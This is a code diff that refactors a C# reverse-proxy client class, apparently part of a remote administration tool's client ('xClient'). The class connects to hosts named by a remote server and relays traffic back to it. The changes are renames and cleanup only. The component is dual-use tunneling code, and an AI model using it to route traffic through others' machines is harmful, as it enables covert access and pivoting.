@@ -1,8 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.Net;
 using System.Net.Sockets;
-using System.Text;
 using xClient.Core.ReverseProxy.Packets;
 
 namespace xClient.Core.ReverseProxy
@@ -16,19 +14,19 @@ namespace xClient.Core.ReverseProxy
         public string Target { get; private set; }
         public int Port { get; private set; }
         public Client Client { get; private set; }
-        private byte[] Buffer;
-        private bool DisconnectIsSend = false;
+        private byte[] _buffer;
+        private bool _disconnectIsSend;
 
-        public ReverseProxyClient(ReverseProxy_Connect Command, Client client)
+        public ReverseProxyClient(ReverseProxyConnect command, Client client)
         {
-            this.ConnectionId = Command.ConnectionId;
-            this.Target = Command.Target;
-            this.Port = Command.Port;
+            this.ConnectionId = command.ConnectionId;
+            this.Target = command.Target;
+            this.Port = command.Port;
             this.Client = client;
             this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
             //Non-Blocking connect, so there is no need for a extra thread to create
-            this.Handle.BeginConnect(Command.Target, Command.Port, Handle_Connect, null);
+            this.Handle.BeginConnect(command.Target, command.Port, Handle_Connect, null);
         }
 
         private void Handle_Connect(IAsyncResult ar)
@@ -43,21 +41,21 @@ namespace xClient.Core.ReverseProxy
             {
                 try
                 {
-                    this.Buffer = new byte[BUFFER_SIZE];
-                    this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                    this._buffer = new byte[BUFFER_SIZE];
+                    this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
                 }
                 catch
                 {
-                    new ReverseProxy_ConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
+                    new ReverseProxyConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
                     Disconnect();
                 }
 
-                IPEndPoint LocalEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
-                new ReverseProxy_ConnectResponse(ConnectionId, true, LocalEndPoint.Address.Address, LocalEndPoint.Port).Execute(Client);
+                IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
+                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address.Address, localEndPoint.Port).Execute(Client);
             }
             else
             {
-                new ReverseProxy_ConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
+                new ReverseProxyConnectResponse(ConnectionId, false, 0, 0).Execute(Client);
             }
         }
 
@@ -67,17 +65,17 @@ namespace xClient.Core.ReverseProxy
 
             try
             {
-                int Received = Handle.EndReceive(ar);
+                int received = Handle.EndReceive(ar);
 
-                if (Received <= 0)
+                if (received <= 0)
                 {
                     Disconnect();
                     return;
                 }
 
-                byte[] Payload = new byte[Received];
-                Array.Copy(Buffer, Payload, Received);
-                new ReverseProxy_Data(this.ConnectionId, Payload).Execute(Client);
+                byte[] payload = new byte[received];
+                Array.Copy(_buffer, payload, received);
+                new ReverseProxyData(this.ConnectionId, payload).Execute(Client);
             }
             catch
             {
@@ -87,7 +85,7 @@ namespace xClient.Core.ReverseProxy
 
             try
             {
-                this.Handle.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
+                this.Handle.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.None, Handle_BeginReceive, null);
             }
             catch
             {
@@ -98,11 +96,11 @@ namespace xClient.Core.ReverseProxy
 
         public void Disconnect()
         {
-            if (!DisconnectIsSend)
+            if (!_disconnectIsSend)
             {
-                DisconnectIsSend = true;
+                _disconnectIsSend = true;
                 //send to the Server we've been disconnected
-                new ReverseProxy_Disconnect(this.ConnectionId).Execute(Client);
+                new ReverseProxyDisconnect(this.ConnectionId).Execute(Client);
             }
 
             try
@@ -114,11 +112,11 @@ namespace xClient.Core.ReverseProxy
             Client.RemoveProxyClient(this.ConnectionId);
         }
 
-        public void SendToTargetServer(byte[] Data)
+        public void SendToTargetServer(byte[] data)
         {
             try
             {
-                Handle.Send(Data);
+                Handle.Send(data);
             }
             catch { Disconnect(); }
         }
